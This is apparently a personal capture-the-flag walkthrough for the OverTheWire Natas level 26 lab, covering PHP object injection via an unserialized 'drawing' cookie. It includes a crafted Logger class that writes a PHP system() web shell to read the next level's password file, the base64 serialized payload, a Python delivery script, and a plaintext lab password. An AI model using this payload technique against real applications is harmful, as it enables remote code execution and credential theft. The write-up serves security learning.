
2024-07-26 12:51

Source: #natas #web 

Tags: [[PHP]] 

## Natas26

also known as - PHP object [[deserialization]]

PHP object injection through the serialized and unserialized PHP functions can be super dangerous especially **if there's complete user control over what data is being serialized**

PHP code from the source shows that it is using object oriented programming as it has a class called `logger`

`__construct()` and `__destruct()` are defined in `logger` 
these double underscore functions are PHP magic object functions so they are necessary and built-in for PHP.

the code further draws from user given x and y coordinates, it does this via a drawing cookie 
source code looks like - 
```
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));  
}
```
`unserializing` data that we have complete control over is a huge vulnerability 
it's using our session ID as the actual location that it's loading the image file from

Since the website is using the session id to name `png` files we can try injecting code but it doesn't work 
on returning the cookies after drawing something we see a drawing cookie along with the session cookie. The drawing cookie is [[base64]] encoded + Url encoded in order to get around this we use - 
```python
import base64
from urllib.parse import unquote
.
.
base64.b64decode(unquote(session.cookies['drawing'])))
```
in the output we get PHP serialized data

this class logger we can actually change what these variables are and what they do, and if we give that to the drawing cookie and the PHP application will like unserialize that data for us, it'll load up this logger and we'll try and write that message and we may be able to take advantage of what we actually write to a file and we can essentially get some code on the server and maybe run our own PHP code because we are writing to a file with this.

create a php file and copy the snippet of `logger `class 
```php
<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
        
        function __construct($file){
            // initialise variables
            $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
            $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/winner.php";
//above we create a custom initalise message and log it to file we can access later
// we write to img because it is trying to load out of that image directory 

			// write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }
        
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }
        
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
$object = new Logger();
echo(base64_encode(serialize($object)));
?>
```
- make sure you run this code with php version 7 only as it only runs on that version
in order to run php directly on kali  - 
```
php7.0 file_name.php 2>/dev/null
```
the output will be a base64 string 
we set that b64 string to our drawing cookie 

```python
import requests
username = 'natas26'
password = 'cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'

url = 'http://natas26.natas.labs.overthewire.org/'
session = requests.Session()
response = session.get(url,auth=(username,password))

response.cookies['PHPSESSID']

session.cookies['drawing'] = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='

response = session.get(url+'?x1=0&y1=0&x2=55&y2=500',auth=(username,password))
print(response.text)
```

after doing this we encounter a fatal error, we know that this means that our code successfully executed we know that we got that object to unserialized

we then change the `get` request to fetch to winner.php file that we manipulated 
```
response = session.get(url+'img/winner.php',auth=(username,password))
```
### References
https://www.youtube.com/watch?v=IgxhtJQL-gY
php magic methods - https://www.php.net/manual/en/language.oop5.magic.php
php version 7.0.33 - https://onlinephp.io/
php object injection  - https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection